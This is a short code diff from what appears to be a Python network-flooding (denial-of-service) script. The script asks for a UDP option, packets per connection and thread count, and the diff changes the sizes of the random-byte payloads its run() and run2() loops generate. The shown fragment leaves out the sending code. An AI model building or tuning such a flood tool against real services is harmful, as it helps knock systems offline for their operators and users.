@@ -10,7 +10,7 @@ choice = str(input(" UDP(y/n):"))
 times = int(input(" Packets per one connection:"))
 threads = int(input(" Threads:"))
 def run():
-	data = random._urandom(65536)
+	data = random._urandom(16535)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
@@ -23,7 +23,7 @@ def run():
 			print("[!] Error!!!")
 
 def run2():
-	data = random._urandom(2048)
+	data = random._urandom(156578)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
